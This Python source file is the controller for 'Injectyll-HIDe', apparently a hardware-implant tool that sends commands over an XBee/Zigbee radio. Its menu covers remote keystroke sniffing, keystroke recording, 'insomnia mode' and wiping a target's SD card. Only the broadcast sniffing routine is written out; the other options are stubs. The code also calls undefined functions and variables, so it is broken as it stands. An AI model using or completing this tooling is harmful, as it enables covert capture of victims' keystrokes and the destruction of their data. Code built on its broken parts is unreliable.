#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#setup the host computer via https://xbplib.readthedocs.io/en/latest/getting_started_with_xbee_python_library.html
#v 0.6 build out scanner
#v 0.7 build in File functionality to save targets
#v 0.8 read in and select from targets
#v 0.9 save keystrokes to file with timestamp name
#v 0.91 format saved keystroke data
#v 0.92 update sent commands to unique "passwords" to prevent simple hijacking
#v 0.93 add functions for 3,4,5 with selection options between specific targets or broadcast 

import time
from digi.xbee.devices import XBeeDevice


def initiate_xbee_device():
    com = input("Enter the com port for your xbee device (e.g. COM22): ")
    baud = input("Enter the target buad rate (e.g. 9600): ")
    try:
        dev = XBeeDevice(com, baud)
        return dev
    except Exception:
        print("There was an error with the submitted location\n")
        print("Please try again")
        
        
def broadcast_tx(d, m):        
    d.send_data_broadcast(m)
    while True:
        try:
        # Check if the XBee has any message in the queue.
        #    received_msg = xbee.receive()
        #    if received_msg:
                # Get the sender's 64-bit address and payload from the received message.
        #        sender = received_msg['sender_eui64']
        #        payload = received_msg['payload']
        #        print("Data received from %s >> %s" % (''.join('{:02x}'.format(x).upper() for x in sender),
        #                                               payload.decode()))
            xbee_message = d.read_data()
            if xbee_message:
                print(xbee_message.data)
        except KeyboardInterrupt:
            print("\n\nReturning to previous menu\n")
            break
            

def target_rx(d, t):    
    while True:
        try:
            print("Work in progress. Needs testing")
            # Instantiate a remote XBee device object.
            remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
            xbee_message = device.read_data(remote_device)
            if xbee_message:
                print(xbee_message)
        except Exception:
            print("An error was encountered connecting to the target. Returning back to the previous menu.")
            break    


def main_menu():
    print("")
    print("------Main Menu------")
    print("")
    print("Current Target Selected: ")
    print("")
    print("Options:")
    print("1) Scan for Zigbee nodes")
    print("2) Sniff keystrokes")
    print("3) Toggle Insomnia mode")
    print("4) Toggle Keystroke Recorder")
    print("5) Wipe target SD card")
    print("6) Exit\n")


def submenu_2(d):
    print("\n\n1) Sniff for all broadcast packets")
    print("2) Sniff packets from target address\n")
    option = input("Choose function: ")
    if option == '1':
        print("\nCtrl+C to exit Sniffing Loop")
        print("\nSending broadcast message to activate sniffing")
        #send out command to start keystroke sniffing
        broadcast_tx(d,"Start sniffing")
    elif option == '2':
        while True:
            try:
                target = input("Enter target address: ")
                print("\nTarget: " % target)
                target_tx(d, target)
            except Exception:
                print("There was an error with the submitted address")
                print("Please try again")
                break
    else:
        print("Invalid selection.  Please try again!")


def banner():
    print(" ______                                          __                __  __          __    __  ______  _______            ")
    print("/      |                                        /  |              /  |/  |        /  |  /  |/      |/       \           ")
    print("$$$$$$/  _______       __   ______    _______  _$$ |_    __    __ $$ |$$ |        $$ |  $$ |$$$$$$/ $$$$$$$  |  ______  ")
    print("  $$ |  /       \     /  | /      \  /       |/ $$   |  /  |  /  |$$ |$$ | ______ $$ |__$$ |  $$ |  $$ |  $$ | /      \ ")
    print("  $$ |  $$$$$$$  |    $$/ /$$$$$$  |/$$$$$$$/ $$$$$$/   $$ |  $$ |$$ |$$ |/      |$$    $$ |  $$ |  $$ |  $$ |/$$$$$$  |")
    print("  $$ |  $$ |  $$ |    /  |$$    $$ |$$ |        $$ | __ $$ |  $$ |$$ |$$ |$$$$$$/ $$$$$$$$ |  $$ |  $$ |  $$ |$$    $$ |")
    print(" _$$ |_ $$ |  $$ |    $$ |$$$$$$$$/ $$ \_____   $$ |/  |$$ \__$$ |$$ |$$ |        $$ |  $$ | _$$ |_ $$ |__$$ |$$$$$$$$/ ")
    print("/ $$   |$$ |  $$ |    $$ |$$       |$$       |  $$  $$/ $$    $$ |$$ |$$ |        $$ |  $$ |/ $$   |$$    $$/ $$       |")
    print("$$$$$$/ $$/   $$/__   $$ | $$$$$$$/  $$$$$$$/    $$$$/   $$$$$$$ |$$/ $$/         $$/   $$/ $$$$$$/ $$$$$$$/   $$$$$$$/ ")
    print("                /  \__$$ |                              /  \__$$ |                                                      ")
    print("                $$    $$/                               $$    $$/                                                       ")
    print("                 $$$$$$/                                 $$$$$$/                                                        \n")
    print("\n")
    print("Injectyll-HIDe version 0.5")
    print("Created by Jonathan Fischer and Jeremy Miller\n\n")


def loop():
    localtime = time.asctime(time.localtime(time.time()))
    banner()  
    device = initiate_xbee_device()
    device.open()

    while True:
        main_menu()
        try:
            option = input("Choose your function: ")
        except KeyboardInterrupt:
            print("\n\nExiting Injectyll-HIDe\n")
            device.close()
            exit()

        if option == '0':
            print("\n\nEnter Option #6 to exit Injectyll-HIDe\n")
        elif option == '1':
            print("\nBuild out the scanner function")
        elif option == '2':
            submenu_2(device)
        elif option == '3':
            print("This option is currently under development.  Please check back later.\n\n")
        elif option == '4':
            print("This option is currently under development.  Please check back later.\n\n")
        elif option == '5':
            print("This option is currently under development.  Please check back later.\n\n")
        elif option == '6':
            device.close()
            exit()
        else:
            print("\nYou did not choose a valid option")


if __name__ == '__main__':
    loop()
